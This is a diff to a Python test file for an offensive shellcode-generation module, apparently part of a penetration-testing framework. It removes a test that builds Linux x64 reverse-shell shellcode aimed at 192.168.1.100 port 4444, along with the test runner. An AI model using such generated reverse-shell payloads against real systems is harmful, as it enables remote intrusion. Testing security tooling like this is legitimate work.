@@ -13,22 +13,6 @@ sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 
 from ofx.api.shellcode import OSShellcodes
 
-
-def test_basic_generation():
-    """Test basic shellcode generation"""
-    print("=" * 60)
-    print("TEST: Basic shellcode generation")
-    print("=" * 60)
-
-    sc = OSShellcodes("linux", "x64", "192.168.1.100", 4444)
-    payload = sc.create_shellcode(shellcode_type="reverse", debug=1)
-
-    print(f"Generated {len(payload)} bytes of shellcode")
-    print(f"First 20 bytes: {payload[:20].hex()}")
-    assert len(payload) > 0, "Shellcode should not be empty"
-    print("✓ Basic generation works\n")
-
-
 def test_xor_encoding():
     """Test XOR encoding"""
     print("=" * 60)
@@ -122,33 +106,3 @@ def test_custom_raw_bytes():
     # Clean up
     OSShellcodes.clear_custom_templates()
     print("✓ Raw bytes template works\n")
-
-
-def main():
-    """Run all tests"""
-    print("\n" + "=" * 60)
-    print("TESTING REFACTORED SHELLCODE MODULE")
-    print("=" * 60 + "\n")
-
-    try:
-        test_basic_generation()
-        test_xor_encoding()
-        test_custom_template()
-        test_bad_chars()
-        test_custom_raw_bytes()
-
-        print("=" * 60)
-        print("ALL TESTS PASSED ✓")
-        print("=" * 60)
-        return 0
-
-    except Exception as e:
-        print(f"\n✗ TEST FAILED: {e}")
-        import traceback
-
-        traceback.print_exc()
-        return 1
-
-
-if __name__ == "__main__":
-    sys.exit(main())
